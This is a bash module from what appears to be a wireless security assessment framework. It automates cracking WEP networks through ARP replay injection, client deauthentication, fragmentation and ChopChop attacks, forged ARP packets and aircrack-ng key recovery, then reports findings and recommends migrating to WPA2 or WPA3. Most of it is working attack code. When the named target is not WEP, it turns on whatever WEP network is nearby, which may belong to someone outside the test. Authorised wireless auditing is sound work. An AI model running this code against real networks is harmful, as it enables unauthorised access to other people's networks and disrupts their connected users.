#!/usr/bin/env bash
# MODULE_META
# NAME="WEP Network Cracking [Past Attacks]"
# CATEGORY="D"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="airodump-ng,aireplay-ng,aircrack-ng,packetforge-ng"
# DESC="Detect and crack legacy WEP networks via ARP replay, fragmentation, ChopChop"
# REQS="monitor_iface,target_ssid"
# PCAP="yes"
# DECODE="wifi_mgmt"

#===============================================================================
#  modules/d2_wep_cracking.sh
#  D2: WEP Network Cracking
#
#  PURPOSE:
#    Detect and attack legacy WEP-encrypted networks. WEP is cryptographically
#    broken but still found on IoT devices, industrial control systems, older
#    hotel/retail WiFi, and embedded systems. Tests include ARP replay, 
#    fragmentation, and ChopChop attacks to recover the WEP key.
#
#  TOOLS: airodump-ng, aireplay-ng, aircrack-ng, packetforge-ng
#  PHASE: 2A — Attack Simulations
#  DEPENDENCIES: A1 (needs scan data to identify WEP networks)
#
#  EVIDENCE PRODUCED:
#    - d2_wep_scan.txt                (WEP networks detected)
#    - d2_wep_capture*.cap            (IV capture files)
#    - d2_cracked_key.txt             (recovered WEP key)
#    - d2_findings.txt                (analysis summary)
#===============================================================================

set -uo pipefail

run_d2() {
    set -uo pipefail

    local interface=""
    local bssid=""
    local ssid=""
    local channel=""
    local evidence_dir="${SESSION_EVIDENCE_DIR:-}"

    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --interface) interface="$2"; shift 2 ;;
            --bssid) bssid="$2"; shift 2 ;;
            --ssid) ssid="$2"; shift 2 ;;
            --channel) channel="$2"; shift 2 ;;
            --evidence-dir) evidence_dir="$2"; shift 2 ;;
            *) shift ;;
        esac
    done

    # Fallbacks to globals
    interface="${interface:-${WIFI_INTERFACE:-}}"
    bssid="${bssid:-${GUEST_BSSID:-}}"
    ssid="${ssid:-${GUEST_SSID:-}}"
    channel="${channel:-${GUEST_CHANNEL:-}}"
    evidence_dir="${evidence_dir:-${SESSION_EVIDENCE_DIR:-.}}"

    local total_steps=7
    local evidence_prefix="${evidence_dir}/d2"
    local wep_scan_file="${evidence_prefix}_wep_scan.txt"
    local findings_file="${evidence_prefix}_findings.txt"
    local cracked_file="${evidence_prefix}_cracked_key.txt"
    local capture_prefix="${evidence_prefix}_wep_capture"

    #--- Step 1: Verify tools & prerequisites ---
    log_step 1 $total_steps "Verifying required tools and targets"
    update_tc_progress 1 $total_steps "Checking dependencies"

    check_module_dependencies "D2" || return 1

    if [[ -z "$ssid" ]]; then
        log_error "Target SSID not set. Run A1 first."
        return 1
    fi

    log_success "Tools and target SSID verified"

    #--- Step 2: Identify WEP networks ---
    log_step 2 $total_steps "Scanning for WEP-encrypted networks"
    update_tc_progress 2 $total_steps "WEP scan"

    WIFI_INTERFACE="$interface"
    enable_monitor_mode || return 1
    local mon_iface="${MONITOR_INTERFACE}"

    {
        echo "============================================================"
        echo "  D2: WEP Network Cracking"
        echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "============================================================"
        echo ""
    } > "$findings_file"

    # Scan for WEP networks
    local scan_prefix="$TMP_DIR/d2_scan"
    rm -f "${scan_prefix}"* 2>/dev/null

    log_info "Running 30s scan for WEP networks..."
    spawn_bg "d2_wep_scan" "airodump-ng" --encrypt WEP --write "$scan_prefix" --output-format csv "$mon_iface"
    sleep 30
    stop_process "d2_wep_scan"

    local wep_networks_found=0
    local target_bssid=""
    local target_channel=""
    local target_ssid=""

    local csv_file
    csv_file=$(ls "${scan_prefix}"*.csv 2>/dev/null | head -1)

    if [[ -n "$csv_file" && -f "$csv_file" ]]; then
        # Parse WEP networks from CSV
        local wep_lines
        wep_lines=$(grep "WEP" "$csv_file" 2>/dev/null | head -20 || true)

        if [[ -n "$wep_lines" ]]; then
            wep_networks_found=$(echo "$wep_lines" | wc -l)

            {
                echo "============================================================"
                echo "  WEP Networks Detected"
                echo "============================================================"
                echo ""
                echo "$wep_lines"
            } > "$wep_scan_file"

            log_result "FINDING" "${wep_networks_found} WEP network(s) detected!"
            echo "FINDING: ${wep_networks_found} WEP networks found" >> "$findings_file"

            # Check if target SSID uses WEP
            local target_line
            target_line=$(echo "$wep_lines" | grep -i "${ssid}" | head -1 || true)

            if [[ -n "$target_line" ]]; then
                target_bssid=$(echo "$target_line" | awk -F, '{print $1}' | xargs)
                target_channel=$(echo "$target_line" | awk -F, '{print $4}' | xargs)
                target_ssid="$ssid"
                log_info "Target ${ssid} uses WEP!"
            else
                # Use first WEP network found
                target_bssid=$(echo "$wep_lines" | head -1 | awk -F, '{print $1}' | xargs)
                target_channel=$(echo "$wep_lines" | head -1 | awk -F, '{print $4}' | xargs)
                target_ssid=$(echo "$wep_lines" | head -1 | awk -F, '{print $14}' | xargs)
                log_info "Target SSID not WEP. Using: ${target_ssid} (${target_bssid})"
            fi
        fi
    fi
    rm -f "${scan_prefix}"* 2>/dev/null

    if [[ $wep_networks_found -eq 0 ]]; then
        log_info "No WEP networks found in range"
        echo "INFO: No WEP networks detected" >> "$findings_file"

        disable_monitor_mode
        
        evidence_register_file "$findings_file"
        evidence_register_file "$wep_scan_file"

        local result_json
        result_json=$(run_fg jq -n \
            --arg status "SECURE" \
            --arg summary "No WEP-encrypted networks detected in range." \
            --arg details "Passive scan completed, no WEP BSSIDs identified." \
            --arg recommendations "No action needed. Continue avoiding WEP deployment." \
            '{status: $status, summary: $summary, details: $details, recommendations: $recommendations, wep_networks_found: 0, key_cracked: false}')
        
        save_tc_result "D2" "$result_json" 0 1 0 1 1 1 0 0 1 1 1
        save_session_state
        return 0
    fi

    #--- Warning banner ---
    echo ""
    echo -e "${C_BG_RED}${C_WHITE}${C_BOLD}"
    echo "  ╔════════════════════════════════════════════════════════════════════╗"
    echo "  ║  ★ WEP CRACKING ATTACK ★                                        ║"
    echo "  ║                                                                    ║"
    echo "  ║  Target: ${target_ssid} (${target_bssid}) CH ${target_channel}    "
    echo "  ║                                                                    ║"
    echo "  ║  WEP is cryptographically broken. This test will:                 ║"
    echo "  ║    • Capture IVs via ARP replay injection                         ║"
    echo "  ║    • Attempt fragmentation / ChopChop if needed                   ║"
    echo "  ║    • Recover the WEP key with aircrack-ng                         ║"
    echo "  ║                                                                    ║"
    echo "  ║  This generates significant traffic on the target network.       ║"
    echo "  ╚════════════════════════════════════════════════════════════════════╝"
    echo -e "${C_RESET}"
    echo ""
    local confirm=""
    stty echo 2>/dev/null
    read -t 0.1 -n 10000 discard 2>/dev/null || true
    printf "  Proceed with WEP cracking? [Y/n]: "
    read confirm
    [[ "${confirm,,}" == "n" ]] && { disable_monitor_mode; return 1; }

    local ivs_collected=0
    local key_cracked="false"
    local cracked_key=""
    local attack_method="arp_replay"

    check_abort || return 1

    #--- Step 3: Set channel and fake authentication ---
    log_step 3 $total_steps "Authenticating to target AP"
    update_tc_progress 3 $total_steps "Fake auth"

    run_fg iw dev "$mon_iface" set channel "$target_channel" 2>/dev/null || true

    # Fake authentication to associate with the AP
    run_fg aireplay-ng --fakeauth 0 -a "$target_bssid" "$mon_iface"

    sleep 2
    check_abort || return 1

    #--- Step 4: Capture IVs + ARP replay ---
    log_step 4 $total_steps "Collecting IVs via ARP replay injection"
    update_tc_progress 4 $total_steps "IV collection"

    rm -f "${capture_prefix}"* 2>/dev/null

    # Start airodump to capture IVs
    spawn_bg "d2_wep_dump" "airodump-ng" --bssid "$target_bssid" \
        --channel "$target_channel" \
        --write "$capture_prefix" \
        --output-format pcap \
        "$mon_iface"

    sleep 3

    # ARP replay attack — generates IVs rapidly
    spawn_bg "d2_wep_replay" "aireplay-ng" --arpreplay -b "$target_bssid" "$mon_iface"

    # Also try deauth to stimulate ARP
    run_fg aireplay-ng --deauth 3 -a "$target_bssid" "$mon_iface"

    start_countdown 120 "Collecting IVs via ARP replay (need ~20,000+ for crack)"
    sleep 120
    stop_countdown

    # Stop replay and capture
    stop_process "d2_wep_replay"
    stop_process "d2_wep_dump"

    # Count IVs collected
    local cap_file
    cap_file=$(ls "${capture_prefix}"*.cap 2>/dev/null | head -1)
    if [[ -n "$cap_file" && -s "$cap_file" ]]; then
        ivs_collected=$(run_fg aircrack-ng "$cap_file" 2>&1 | grep -oP '\d+ IVs' | grep -oP '\d+' | head -1) || ivs_collected=0
        log_info "Collected ${ivs_collected} IVs"
    fi

    check_abort || return 1

    #--- Step 5: Attempt fragmentation if low IVs ---
    log_step 5 $total_steps "Fragmentation/ChopChop attack (if needed)"
    update_tc_progress 5 $total_steps "Fragmentation"

    if [[ ${ivs_collected:-0} -lt 5000 ]]; then
        log_info "Low IV count (${ivs_collected}) — attempting fragmentation attack..."
        attack_method="fragmentation"

        # Fragmentation attack to get a PRGA keystream
        local prga_file="$TMP_DIR/d2_prga.xor"
        rm -f "$prga_file"
        
        # Use timeout as fragmentation/chopchop can hang or take long
        timeout 60 run_fg aireplay-ng --fragment \
            -b "$target_bssid" \
            "$mon_iface" \
            -o "$prga_file" \
            &>/dev/null || true

        if [[ ! -f "$prga_file" ]]; then
            log_info "Fragmentation failed — trying ChopChop..."
            attack_method="chopchop"
            timeout 60 run_fg aireplay-ng --chopchop \
                -b "$target_bssid" \
                "$mon_iface" \
                &>/dev/null || true
        fi

        # If we got a keystream, forge ARP packets to generate IVs
        if [[ -f "$prga_file" ]]; then
            log_info "Got keystream — forging ARP packets..."
            local forged_arp="$TMP_DIR/d2_arp.cap"
            run_fg packetforge-ng -0 -a "$target_bssid" \
                    -h "$(run_tool ip link show "$mon_iface" | awk '/ether/{print $2}')" \
                    -l 255.255.255.255 -k 255.255.255.255 \
                    -y "$prga_file" \
                    -w "$forged_arp"
            
            if [[ -f "$forged_arp" ]]; then
                 spawn_bg "d2_wep_replay_forged" "aireplay-ng" -r "$forged_arp" "$mon_iface"
                 sleep 30
                 stop_process "d2_wep_replay_forged"
                 rm -f "$forged_arp"
            fi
        fi
        rm -f "$prga_file"
    fi

    check_abort || return 1

    #--- Step 6: Crack the WEP key ---
    log_step 6 $total_steps "Cracking WEP key with aircrack-ng"
    update_tc_progress 6 $total_steps "Cracking"

    if [[ -n "$cap_file" && -s "$cap_file" ]]; then
        local crack_output
        crack_output=$(run_fg aircrack-ng -b "$target_bssid" "$cap_file" 2>&1 || true)
        echo "$crack_output" >> "$findings_file"

        # Check for cracked key
        local found_key
        found_key=$(echo "$crack_output" | grep -i "KEY FOUND" | grep -oP '\[.*?\]' | tr -d '[]' || true)

        if [[ -n "$found_key" ]]; then
            key_cracked="true"
            cracked_key="$found_key"
            echo "$cracked_key" > "$cracked_file"
            log_result "CRITICAL" "★ WEP KEY CRACKED: ${cracked_key}"
            echo "CRITICAL: WEP key recovered: ${cracked_key}" >> "$findings_file"
        else
            log_info "Key not cracked — may need more IVs (collected: ${ivs_collected})"
            echo "INFO: Key not cracked with ${ivs_collected} IVs" >> "$findings_file"
        fi
    fi

    # Restore managed mode
    disable_monitor_mode

    #--- Step 7: Save results ---
    log_step 7 $total_steps "Saving results"
    update_tc_progress 7 $total_steps "Saving"

    local result_status="FINDING"
    local result_summary=""
    local recommendations=""

    if [[ "$key_cracked" == "true" ]]; then
        result_status="CRITICAL"
        result_summary="CRITICAL: WEP key recovered (${cracked_key}) for ${target_ssid} using ${attack_method}."
        recommendations="1) IMMEDIATELY migrate from WEP to WPA2 or WPA3. 2) Treat as an open network. 3) Replace legacy equipment."
    elif [[ $wep_networks_found -gt 0 ]]; then
        result_summary="${wep_networks_found} WEP network(s) detected. Key not cracked but WEP is trivially breakable."
        recommendations="1) Migrate ALL WEP networks to WPA2/WPA3 immediately. 2) Presence of WEP indicates legacy equipment."
    fi

    evidence_register_file "$findings_file"
    evidence_register_file "$wep_scan_file"
    [[ -f "$cracked_file" ]] && evidence_register_file "$cracked_file"
    [[ -n "$cap_file" && -f "$cap_file" ]] && evidence_register_file "$cap_file"

    local result_json
    result_json=$(run_fg jq -n \
        --arg status "$result_status" \
        --arg summary "$result_summary" \
        --arg details "WEP networks: ${wep_networks_found}, Target: ${target_bssid:-none}, IVs: ${ivs_collected}, Cracked: ${key_cracked}, Method: ${attack_method}" \
        --arg recommendations "$recommendations" \
        --argjson wep_networks_found "$wep_networks_found" \
        --arg target_bssid "${target_bssid:-none}" \
        --argjson ivs_collected "${ivs_collected:-0}" \
        --arg key_cracked "$key_cracked" \
        --arg cracked_key "$cracked_key" \
        --arg attack_method "$attack_method" \
        '{
            status: $status,
            summary: $summary,
            details: $details,
            recommendations: $recommendations,
            wep_networks_found: $wep_networks_found,
            target_bssid: $target_bssid,
            ivs_collected: $ivs_collected,
            key_cracked: ($key_cracked == "true"),
            cracked_key: $cracked_key,
            attack_method: $attack_method
        }')

    # 11 Flags: pcap_req, has_tool, has_pri, has_cmd, has_ver, has_env, has_conf, has_known, runtime, clean, secure
    local has_pri=0
    [[ "$key_cracked" == "true" ]] && has_pri=1
    
    save_tc_result "D2" "$result_json" 1 1 $has_pri 1 1 1 0 1 1 1 0
    save_session_state

    return 0
}
